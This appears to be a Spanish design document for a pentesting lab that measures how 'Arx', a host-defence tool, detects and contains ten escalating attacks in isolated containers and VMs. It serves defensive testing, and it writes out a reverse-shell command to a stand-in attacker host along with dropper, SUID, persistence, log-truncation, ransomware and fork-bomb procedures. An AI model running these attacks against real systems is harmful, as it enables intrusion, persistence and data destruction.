# Laboratorio de pentesting de Arx — niveles 1 a 10

**Propósito:** probar Arx en "modo real" — atacar un entorno aislado donde Arx defiende,
desde lo más trivial hasta intentar destruirlo — y medir exactamente qué detecta, qué
contiene y qué se le escapa. Los huecos encontrados aquí se convierten en trabajo del
roadmap; nada se maquilla.

**Reglas de compromiso (ROE):** solo contra el entorno de laboratorio (red aislada,
sin salida a internet en el mini-lab Docker; VLAN host-only en la VM). Snapshot limpio
antes de cada nivel destructivo. Nunca herramientas del lab contra terceros.

---

## Entornos

### A. Mini-lab Docker (rápido; niveles 1–6 y regresiones)

Dos contenedores en una red interna sin salida:

```bash
docker network create --internal arx-lab
# Víctima: Ubuntu 22.04 privilegiada + Arx instalado (deb o fuente), baseline sellada
# Atacante: kalilinux/kali-rolling con nmap/hydra/netcat
```

Limitaciones honestas: sin systemd ni auditd completos → los sensores de Arx degradan a
los colectores base (/proc, puertos, integridad, canarios). Sirve para iterar rápido,
no como veredicto final.

### B. VM real (niveles 7–10 y validación definitiva)

- VM Ubuntu 22.04 en UTM/Parallels/VMware (el Mac) o VirtualBox, red host-only.
- **Snapshot "oro":** Arx instalado, `setup` hecho, baseline aprendida y sellada,
  canarios plantados, `arx service install --enforce` activo.
- Atacante: otra VM (Kali) en la misma red host-only.
- Restaurar el snapshot oro entre niveles. En el nivel 10 SE ESPERA destruir la VM.

### C. Range cloud (futuro)

Par de VPS desechables para tráfico real saliente del atacante (TOR, C2 público de
laboratorio). Solo cuando A y B estén verdes.

---

## Los 10 niveles

| Nivel | Ataque (procedimiento) | Comportamiento esperado de Arx | Pasa si… |
|---|---|---|---|
| **1 — Reconocimiento** | `nmap -sS` desde el atacante | Pista kernel nft (`inet arx scan4/6`: cada SYN entrante, incluso a puertos cerrados) → ≥8 puertos/10 min → **Tier 1: bloqueo de IP** | Hallazgo `port_scan` + elemento en `block_ipv4` + atacante sin alcance (curl agota tiempo). Sin nftables degrada a procfs (solo puertos que aceptan) |
| **2 — Fuerza bruta** | 8 intentos SSH fallidos reales (sshpass) | auth.log incremental → ≥6 fallos/10 min desde una IP → **Tier 1: bloqueo de IP** | Hallazgo `auth_bruteforce` + IP bloqueada |
| **3 — Credencial débil** | Login SSH con usuario nuevo/credencial por defecto | `login_users` fuera de baseline → hallazgo high | Hallazgo nuevo registrado y alertado |
| **4 — Explotación de servicio** | App web vulnerable plantada (RCE) → el atacante abre un listener nuevo (p. ej. 4444) | Puerto nuevo → Tier 1: bloqueo firewall REAL + registro | Regla de bloqueo visible (ufw/nft) y auto-expira |
| **5 — Dropper** | Descargar "malware" a `/tmp`, `chmod +x`, ejecutarlo | Ejecutable nuevo en dir sospechoso (high) → **SIGSTOP** inmediato | Proceso en estado T; SIGCONT al expirar; reaparición → Tier 2 |
| **6 — Reverse shell** | `bash -i >& /dev/tcp/atacante/4444` desde la víctima; el atacante envía órdenes por el canal | Correlación conexión→proceso (inode de socket → `/proc/<pid>/exe`): un shell con socket saliente → **Tier 1: canal bloqueado con DROP en nftables + SIGSTOP solo del proceso dueño** | La orden previa se ejecuta; tras detectar, otra orden NO llega aunque se descongele el shell y no puede reconectar; otro `bash` del host sigue intacto; al expirar, la orden retenida SÍ llega (reversible de verdad). Intérpretes generales (python/perl) quedan para F8 |
| **7 — Escalada** | Plantar binario SUID nuevo (`chmod u+s`) | Barrido SUID + integridad → **crit** | Hallazgo crit en el siguiente barrido SUID |
| **8 — Persistencia** | Entrada en cron/systemd/`authorized_keys` | Integridad drift → **crit → Tier 2** (humano decide) → restauración desde vault + intruso en cuarentena | Pendiente autorizado → fichero hostil fuera de su sitio y preservado como evidencia |
| **9 — Anti-forense** | Truncar logs + leer ficheros sensibles (señuelos) | Canary: lectura detectada (alta, one-shot); **truncado de auth.log → `log_tamper`** | Canary ✓ + hallazgo `log_tamper` (mismo inode, tamaño menor) |
| **10 — Destrucción total** | Ransomware simulado (cifrado masivo en árbol señuelo) + fork bomb + `rm -rf` sobre señuelos; en VM | **El freno de seguridad salta**: Arx deja de actuar tras 5 acciones/hora, escala todo a humano, alerta crítica masiva | Breaker disparado + alertas emitidas + nada irreversible hecho por Arx; la VM puede morir — por eso es VM |

**Criterio de nivel superado:** el comportamiento esperado ocurre Y queda evidencia en
`incidents.jsonl` / `arx status`. Un nivel en GAP no es un fracaso del lab: es el mapa
honesto de lo que falta construir (y cada gap ya tiene fase en el roadmap).

---

## Los otros tres labs

| Lab | Qué añade | Comando |
|---|---|---|
| **systemd** | `.deb` real, `arx setup` por consola, el unit y su endurecimiento, journald, `kill -9`, reinicio y `flush` de nftables, `ufw` con reglas `allow` previas, el modelo desde el servicio (su respuesta se simula), gobierno desde el chat con un Telegram falso | `bash lab/systemd-lab.sh` |
| **Día normal** | Nada de ataques: apt, servicios, logrotate, tmux, useradd, una app propia, scp, todo con `--enforce`. Mide si Arx estorba y cuánto ruido hace. Es sintético: da una primera cifra, no la métrica | `bash lab/normal-day.sh` |
| **Nivel 10** | Señuelos cifrados, tormenta contra el freno, fork bomb acotada, borrado de logs, `kill -9`. Lo que se mide: sigue en pie, avisa y no hace nada irreversible | `bash lab/level10.sh` |

Usan una imagen propia, `lab/systemd/Dockerfile`, hecha solo con la `ubuntu:22.04` oficial y paquetes
de Ubuntu. Con systemd como PID 1 en un contenedor privilegiado, comparten kernel con Docker: no hay
auditd ni reinicio real del kernel. No sustituyen a la VM (`lab/vm/`), que sigue sin correrse.

## Ejecución

```bash
lab/docker-lab.sh        # mini-lab DOS contenedores: L1, L2 y L6 reales (nmap/sshpass/
                         # reverse shell desde el atacante) + L4,5,7,8,9 en la víctima +
                         # prueba de contención + fase tarpit (estrangula en vez de bloquear)
lab/demo.sh              # versión corta de tres ataques, con la salida real de Arx (GIF del README)
```

El scoreboard imprime PASS/FAIL por nivel. Los niveles 3 y 10 se corren en contenedor (L3 con sshd
real aquí y en el lab systemd; L10 en `lab/level10.sh`); la VM de `lab/vm/` sigue pendiente. El nivel 6
se valida en la fase de red: el atacante escucha con `nc`, la víctima abre el reverse shell
clásico y Arx corta el canal y suspende solo al dueño. Límite honesto: los reverse shell por
intérprete general (python, perl, php) se dejan para los sensores de comportamiento de F8.

El **tarpit (Core)** se valida en su propia fase: con la política `ip_response=tarpit`, Arx
mete la IP del escáner en el set nft `tarpit4` (no en `block_ipv4`), y el efecto se mide desde
el atacante: `nmap` debe dejar de ver los puertos abiertos (medido: de 13 a 1 visible, y de
4061 a 2,1 conexiones/s). Solo se aplica a escaneos: contra una fuerza bruta SSH apenas frena
(de 56 a 34 contraseñas en 20 s), así que esa se sigue bloqueando. No es un tarpit clásico de
retención de conexión.

**Ficheros-trampa (`hostile`):** el bucle de guardia lee datos que controla el atacante. Un
dropper con una cola hostil, un FIFO en su ruta, un dropper que se borra a sí mismo y nombres
con bytes no UTF-8 o saltos de línea no pueden colgar ni tumbar a Arx, y el dropper debe
quedar suspendido.

**Identidad (`identity`):** el bloqueo de cuenta se prueba contra `sshd` real. Sesiones con y sin
terminal, un proceso desligado y un root nacido de la sesión deben morir; la llave y la contraseña
deben dejar de entrar, seguir así un mes después y volver con `arx unlock`; y una cuenta que el admin
ya había bloqueado debe seguir bloqueada. `identity-llm` hace lo mismo con el veredicto del modelo
sobre un acceso real desde el atacante (solo su respuesta se simula), e `identity-forged` comprueba
que una línea falsa en auth.log no bloquea a nadie.

**FORWARD:** un servicio publicado por DNAT, como hace Docker. La IP bloqueada no debe llegar a él.

**Propuestas:** cerrar las contraseñas de SSH contra `sshd` real, medido desde el atacante, con la
llave todavía dentro, y deshacerlo.

**Vacunas (F17):** el canal se sirve desde el contenedor del atacante, para que quede claro que la
firma es lo que manda: lo alterado y lo de otra clave se descarta sin abrir. Dos hosts validan el
mismo paquete por su cuenta, y una regla que casa con un binario de uno solo se rechaza solo allí.

Dos lecciones del harness: `ncat` con stdin cerrado (`docker exec -d`) cierra cada conexión
al instante, por eso el C2 usa `nc`; y `ss -K` no sirve para validar nada en Docker Desktop,
porque su kernel no trae `CONFIG_INET_DIAG_DESTROY` y la orden devuelve 0 sin cortar.
